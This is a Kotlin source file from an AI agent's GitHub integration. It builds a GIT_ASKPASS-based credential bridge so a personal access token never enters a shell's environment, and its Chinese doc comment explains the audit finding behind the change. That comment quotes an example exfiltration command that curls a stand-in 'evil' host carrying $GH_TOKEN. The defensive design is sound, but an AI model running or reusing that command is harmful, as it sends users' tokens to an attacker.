package com.apex.agent.github

/**
 * # GitHub 终端凭据桥（纯函数，无状态）—— Git 审计 P0-1 根修
 *
 * **旧实现（已废除）**：把 `GH_TOKEN`/`GITHUB_TOKEN` 写进整个 `sh -c`
 * 进程 env——复合命令 `git pull && curl -s https://evil/x -H "t: $GH_TOKEN"`
 * 首词是 git 即命中首词启发式，后半段任意命令直接读走 PAT；恶意仓库的
 * git hooks（作为 git 子进程）同样继承 env。这是审计判定的确定性凭据
 * 外传链。
 *
 * **新实现**：PAT **零进 env**。凭据经一次性 `GIT_ASKPASS` 脚本签发
 * （脚本本体由 [GithubCredentialIssuer] 写入 guest /tmp、含 PAT、命令结束
 * 吊销——runner 通道显式 dispose，终端通道靠 30 分钟惰性清扫兜底），
 * env 里只出现脚本**路径**：
 *
 * - `GIT_ASKPASS`：git 在 HTTPS 需要凭据时调用——脚本校验提示串指向
 *   github.com 才应答（凭据只流向 github.com，恶意 hooks 继承路径也
 *   无法把 token 读走，除非它对 github.com 发起真实 git 操作）；
 * - `GIT_TERMINAL_PROMPT=0`：askpass 失败时 git 快速失败而非挂起等终端。
 *
 * ## 触发条件
 * [isGitOrGhCommand]：命令首词（basename）是 `git` 或 `gh`。复合命令
 * （`cd /ws && git pull`）首词是 cd → 不注入。启发式仍保留的正当性：
 * 注入内容已无秘密（只有路径），启发式漏判的代价从「凭据外传」降级为
 * 「该命令拿不到凭据」；命中面越窄，askpass 脚本的暴露窗口越小。
 *
 * ## 行为变化（诚实声明）
 * - 终端里 `git push`（私有/push 类）依旧可用（askpass 应答）；
 * - 终端里 `gh pr create` 等 gh 命令**失去认证**（GH_TOKEN 不再注入，
 *   gh 无 askpass 语义）——引导走 GitHub REST 工具族；
 * - 非github.com 远程无凭据（白名单策略，见 GitCommandPolicy）。
 */
object GithubTerminalEnvInjector {

    /**
     * 注入 git 凭据桥到命令执行 env。
     *
     * @param env 命令原 guest env 基线（不会被修改——返回新 map）。
     * @param command 命令串（首词判定 git/gh；可为完整命令行，只看首词）。
     * @param askPassGuestPath 已签发的 askpass 脚本 guest 路径
     *   （null = 未连接 GitHub 或签发失败 → 原样返回，零注入零报错）。
     * @return 注入后的 env（无注入时同引用返回，零拷贝）。
     */
    fun inject(
        env: Map<String, String>,
        command: String,
        askPassGuestPath: String?,
    ): Map<String, String> {
        if (askPassGuestPath.isNullOrBlank()) return env
        if (!isGitOrGhCommand(command)) return env
        val result = LinkedHashMap(env)
        result["GIT_ASKPASS"] = askPassGuestPath
        // askpass 不可用/拒答时快速失败，绝不挂起等终端输入（TERM=dumb
        // 的管道执行通道里终端提示只会变成静默挂起）
        result["GIT_TERMINAL_PROMPT"] = "0"
        return result
    }

    /**
     * 命令首词是否为 git / gh（basename 语义：`/usr/bin/git ...` 与
     * `git ...` 等价；引号/括号包裹与首行复合语句按首词判定）。
     */
    fun isGitOrGhCommand(command: String): Boolean {
        val first = command.trim()
            .lineSequence()
            .firstOrNull()
            ?.split(Regex("\\s+"))
            ?.firstOrNull()
            ?.trim('"', '\'', '(', ')')
            ?.substringAfterLast('/')
            ?.lowercase()
            ?: return false
        return first == "git" || first == "gh"
    }
}
